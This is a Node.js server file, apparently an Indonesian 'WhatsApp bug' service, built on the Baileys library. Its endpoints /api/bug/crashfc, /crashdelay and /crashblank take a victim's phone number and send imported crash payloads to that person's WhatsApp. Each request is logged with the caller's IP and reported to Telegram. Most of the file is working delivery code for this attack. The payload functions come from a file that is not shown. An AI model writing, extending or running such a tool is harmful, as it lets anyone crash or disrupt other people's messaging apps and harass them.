console.clear();  
require('./public/settings/config')
console.log('starting...');  
process.on("uncaughtException", console.error);  
  
const {
    default: makeWASocket,   
    prepareWAMessageMedia,   
    removeAuthState,  
    useMultiFileAuthState,   
    DisconnectReason,   
    fetchLatestBaileysVersion,   
    makeInMemoryStore,   
    generateWAMessageFromContent,   
    generateWAMessageContent,   
    generateWAMessage,  
    jidDecode,   
    proto,   
    delay,  
    relayWAMessage,   
    getContentType,   
    generateMessageTag,  
    getAggregateVotesInPollMessage,   
    downloadContentFromMessage,   
    fetchLatestWaWebVersion,   
    InteractiveMessage,   
    makeCacheableSignalKeyStore,   
    Browsers,   
    generateForwardMessageContent,   
    MessageRetryMap   
} = require("@whiskeysockets/baileys");  
  
const pino = require('pino');  
const readline = require("readline");  
const fs = require('fs');  
const express = require("express");  
const bodyParser = require('body-parser');  
const cors = require("cors");  
const path = require("path");    
  
const app = express();  
const PORT = process.env.PORT || 5036

const { SenjuFC, SenjuBlank, SenjuDelay } = require('./public/service/bugs')
const { getRequest, sendTele } = require('./public/engine/telegram')

app.enable("trust proxy");  
app.set("json spaces", 2);  
app.use(cors());  
app.use(express.urlencoded({   
  extended: true   
}));  
app.use(express.json());  
app.use(express.static(path.join(__dirname, "public")));  
app.use(bodyParser.raw({   
  limit: '50mb',   
  type: '*/*'   
}));  

const { Boom } = require('@hapi/boom');
const usePairingCode = true;  

const question = (text) => {
    const rl = readline.createInterface({
        input: process.stdin,   
        output: process.stdout   
    })
    return new Promise((resolve) => {  
        rl.question(text, resolve)   
    });  
}

async function clientstart() {
	const { state, saveCreds } = await useMultiFileAuthState(`./session`)
    const { version, isLatest } = await fetchLatestBaileysVersion();
    const client = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.00"]
    });
      
     if (!client.authState.creds.registered) {
    console.log(`[!] Belum ada session! Pairing via POST /api/pair`)
  }
  
const limitFile = path.join(__dirname, './database/command_limit.json');
const defaultCommandLimit = 1;

function checkCommandLimitAuto(endpointPath) {
  let data = {};
  if (fs.existsSync(limitFile)) {
    data = JSON.parse(fs.readFileSync(limitFile));
  }
  const cmd = endpointPath;
  const used = data[cmd]?.used || 0;
  const max = data[cmd]?.max || defaultCommandLimit;
  return {
    used,
    max,
    exceeded: used >= max
  };
}

function incrementCommandUsageAuto(endpointPath) {
  let data = {};
  if (fs.existsSync(limitFile)) {
    data = JSON.parse(fs.readFileSync(limitFile));
  }
  const cmd = endpointPath;
  if (!data[cmd]) data[cmd] = { used: 0, max: defaultCommandLimit };
  data[cmd].used += 1;
  fs.writeFileSync(limitFile, JSON.stringify(data, null, 2));
}

app.post('/api/aturlimit', (req, res) => {
  const { endpoint, max } = req.body;
  if (!endpoint || typeof max !== 'number') {
    return res.status(400).json({ status: false, message: 'Parameter endpoint dan max wajib diisi' });
  }

  let data = {};
  if (fs.existsSync(limitFile)) {
    data = JSON.parse(fs.readFileSync(limitFile));
  }

  if (!data[endpoint]) data[endpoint] = { used: 0, max };
  else data[endpoint].max = max;

  fs.writeFileSync(limitFile, JSON.stringify(data, null, 2));
  res.json({ status: true, message: `Limit endpoint ${endpoint} diatur menjadi ${max}` });
});
app.post('/api/resetlimit', async (req, res) => {
  try {
    const limitPath = path.join(__dirname, '.database/command_limit.json');

    if (fs.existsSync(limitPath)) {
      const current = JSON.parse(fs.readFileSync(limitPath));
      for (const key in current) {
        current[key].used = 0;
      }
      fs.writeFileSync(limitPath, JSON.stringify(current, null, 2));
      res.json({ status: true, message: 'Semua limit berhasil di-reset.' });
    } else {
      res.status(404).json({ status: false, message: 'File limit tidak ditemukan.' });
    }
  } catch (err) {
    res.status(500).json({ status: false, message: 'Gagal mereset limit.', error: err.message });
  }
});

  app.post("/api/pair", async (req, res) => {
  const { number } = req.body;
  if (!number) return res.status(400).json({ message: "Nomor diperlukan!" });

  try {
    const code = await client.requestPairingCode(number, "MANG1234");
    console.log("Pairing code:", code);
    res.json({ status: true, code });
  } catch (err) {
    console.error("Pairing gagal:", err.message);
    res.status(500).json({ status: false, message: "Gagal pairing", error: err.message });
  }
});

  app.post('/api/bug/crashfc', async (req, res) => {
  const { target } = req.body;

  if (!target) {
    return res.status(400).json({
      status: false,
      message: 'Parameter target diperlukan',
    });
  }
  
  const limitStatus = checkCommandLimitAuto(req.path);
  if (limitStatus.exceeded) {
    return res.status(429).json({
      status: false,
      message: `Limit tercapai Maks: ${limitStatus.max}`
    });
  }
  
  const nomorBersih = target.replace(/[^0-9]/g, '');
  if (nomorBersih.startsWith('0')) {
    return res.json('Gunakan awalan kode negara!');
  }

  const jid = `${nomorBersih}@s.whatsapp.net`;
  const info = await getRequest(req);

  try {
    for (let i = 1; i <= 1; i++) {
      await SenjuFC(client, jid);
      console.log(`(${i}/1) Berhasil kirim bug ke ${jid}`);
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    incrementCommandUsageAuto(req.path);
    res.json({
    status: true,
    creator: global.creator,
    result: 'Berhasil dikirim 1 kali',
  });

    const waktu = new Date().toLocaleString('id-ID', {
      timeZone: 'Asia/Jakarta',
    });

    const log = {
      endpoint: '/api/bug/crashfc',
      target,
      number: jid,
      ip: info.ip,
      method: info.method,
      waktu,
    };

    const riwayatPath = path.join(__dirname, 'riwayat.json');
    let riwayat = [];

    if (fs.existsSync(riwayatPath)) {
      try {
        const content = fs.readFileSync(riwayatPath);
        riwayat = JSON.parse(content);
      } catch (err) {
        console.error('[!] Gagal membaca riwayat.json:', err.message);
      }
    }

    riwayat.unshift(log);
    fs.writeFileSync(riwayatPath, JSON.stringify(riwayat, null, 2));

    const teksLog = `
[API HIT]

Endpoint: crashfc
Target: ${target}
IP: ${info.ip}
Method: ${info.method}
Jumlah: 15x
Waktu: ${info.timestamp}

Log otomatis oleh sistem monitoring MalzXyz API.
    `;
    sendTele(teksLog);
  } catch (error) {
    console.error('[!] Gagal kirim bug:', error.message);
  }
});
 
 app.post('/api/bug/crashdelay', async (req, res) => {
  const { target } = req.body;

  if (!target) {
    return res.status(400).json({
      status: false,
      message: 'Parameter target diperlukan',
    });
  }
  
  const limitStatus = checkCommandLimitAuto(req.path);
  if (limitStatus.exceeded) {
    return res.status(429).json({
      status: false,
      message: `Limit tercapai Maks: ${limitStatus.max}`
    });
  }
  
  const nomorBersih = target.replace(/[^0-9]/g, '');
  if (nomorBersih.startsWith('0')) {
    return res.json('Gunakan awalan kode negara!');
  }

  const jid = `${nomorBersih}@s.whatsapp.net`;
  const info = await getRequest(req);

  try {
    for (let i = 1; i <= 1; i++) {
      await SenjuDelay(client, jid);
      console.log(`(${i}/1) Berhasil kirim bug ke ${jid}`);
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    incrementCommandUsageAuto(req.path);
    res.json({
    status: true,
    creator: global.creator,
    result: 'Berhasil dikirim 1 kali',
  });

    const waktu = new Date().toLocaleString('id-ID', {
      timeZone: 'Asia/Jakarta',
    });

    const log = {
      endpoint: '/api/bug/crashdelay',
      target,
      number: jid,
      ip: info.ip,
      method: info.method,
      waktu,
    };

    const riwayatPath = path.join(__dirname, 'riwayat.json');
    let riwayat = [];

    if (fs.existsSync(riwayatPath)) {
      try {
        const content = fs.readFileSync(riwayatPath);
        riwayat = JSON.parse(content);
      } catch (err) {
        console.error('[!] Gagal membaca riwayat.json:', err.message);
      }
    }

    riwayat.unshift(log);
    fs.writeFileSync(riwayatPath, JSON.stringify(riwayat, null, 2));

    const teksLog = `
[API HIT]

Endpoint: crashdelay
Target: ${target}
IP: ${info.ip}
Method: ${info.method}
Jumlah: 15x
Waktu: ${info.timestamp}

Log otomatis oleh sistem monitoring MalzXyz API.
    `;
    sendTele(teksLog);
  } catch (error) {
    console.error('[!] Gagal kirim bug:', error.message);
  }
});

app.post('/api/bug/crashblank', async (req, res) => {
  const { target } = req.body;

  if (!target) {
    return res.status(400).json({
      status: false,
      message: 'Parameter target diperlukan',
    });
  }
  
  const limitStatus = checkCommandLimitAuto(req.path);
  if (limitStatus.exceeded) {
    return res.status(429).json({
      status: false,
      message: `Limit tercapai Maks: ${limitStatus.max}`
    });
  }
  
  const nomorBersih = target.replace(/[^0-9]/g, '');
  if (nomorBersih.startsWith('0')) {
    return res.json('Gunakan awalan kode negara!');
  }

  const jid = `${nomorBersih}@s.whatsapp.net`;
  const info = await getRequest(req);

  try {
    for (let i = 1; i <= 1; i++) {
      await SenjuBlank(client, jid);
      console.log(`(${i}/1) Berhasil kirim bug ke ${jid}`);
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    incrementCommandUsageAuto(req.path);
    res.json({
    status: true,
    creator: global.creator,
    result: 'Berhasil dikirim 1 kali',
  });

    const waktu = new Date().toLocaleString('id-ID', {
      timeZone: 'Asia/Jakarta',
    });

    const log = {
      endpoint: '/api/bug/crashblank',
      target,
      number: jid,
      ip: info.ip,
      method: info.method,
      waktu,
    };

    const riwayatPath = path.join(__dirname, 'riwayat.json');
    let riwayat = [];

    if (fs.existsSync(riwayatPath)) {
      try {
        const content = fs.readFileSync(riwayatPath);
        riwayat = JSON.parse(content);
      } catch (err) {
        console.error('[!] Gagal membaca riwayat.json:', err.message);
      }
    }

    riwayat.unshift(log);
    fs.writeFileSync(riwayatPath, JSON.stringify(riwayat, null, 2));

    const teksLog = `
[API HIT]

Endpoint: crashblank
Target: ${target}
IP: ${info.ip}
Method: ${info.method}
Jumlah: 15x
Waktu: ${info.timestamp}

Log otomatis oleh sistem monitoring MalzXyz API.
    `;
    sendTele(teksLog);
  } catch (error) {
    console.error('[!] Gagal kirim bug:', error.message);
  }
});
    
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});
app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard.html'));
});
app.get('/command_limit.json', (req, res) => {
  res.sendFile(path.join(__dirname, './database/command_limit.json'));
});
app.get('/api/bug/protocolbug6', (req, res) => {
  res.status(404).sendFile(path.join(__dirname, '404.html'));
});
app.get('/api/bug/invisfc', (req, res) => {
  res.status(404).sendFile(path.join(__dirname, '404.html'));
});
app.get('/api/bug', (req, res) => {
  res.status(404).sendFile(path.join(__dirname, '404.html'));
});
app.get('/api', (req, res) => {
  res.status(404).sendFile(path.join(__dirname, '404.html'));
});

app.get('/api/restart', async (req, res) => {
  res.json({ status: true, message: "Server akan direstart..." });
  console.log("[!] Server restarting by request...");
  setTimeout(() => {
    process.exit(1);
  }, 1000);
});

app.post('/api/session/delete', async (req, res) => {
  try {
    const sessionPath = path.join(__dirname, 'session');
    if (fs.existsSync(sessionPath)) {
      fs.rmSync(sessionPath, { recursive: true, force: true });
      console.log('[!] Session folder berhasil dihapus.');
      res.json({ status: true, message: "Session berhasil dihapus. Silakan pairing ulang." });
      await delay(3000);
      process.exit(1);
    } else {
      res.status(404).json({ status: false, message: "Session tidak ditemukan." });
    }
  } catch (err) {
    console.error('[!] Gagal menghapus session:', err.message);
    res.status(500).json({ status: false, message: "Gagal menghapus session.", error: err.message });
  }
});


app.get('/api/session-status', async (req, res) => {
  try {
    const sessionPath = './session/creds.json'
    if (fs.existsSync(sessionPath)) {
      const session = JSON.parse(fs.readFileSync(sessionPath))
      if (session && session.me) {
        return res.json({ status: true, connected: true, me: session.me });
      }
    }
    res.json({ status: true, connected: false });
  } catch (e) {
    res.status(500).json({ status: false, message: 'Gagal cek session', error: e.message });
  }
});
   
    client.ev.on('connection.update', (update) => {
        const { konek } = require('./public/connection/connect')
        konek({ 
            client, 
            update, 
            clientstart,
            DisconnectReason,
            Boom
        })  
    })  
    
    client.ev.on('creds.update', saveCreds);  
    return client;
}
      
clientstart()

app.use('/riwayat.json', express.static(path.join(__dirname, 'riwayat.json')));

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
}).on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`Port ${PORT} is in use. Trying another port...`);
    const newPort = Math.floor(Math.random() * (65535 - 1024) + 1024);
    app.listen(newPort, () => {
      console.log(`Server is running on http://localhost:${newPort}`);
    });
  } else {
    console.error('An error occurred:', err.message);
  }
});

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {  
  require('fs').unwatchFile(file)  
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')  
  delete require.cache[file]  
  require(file)  
})  
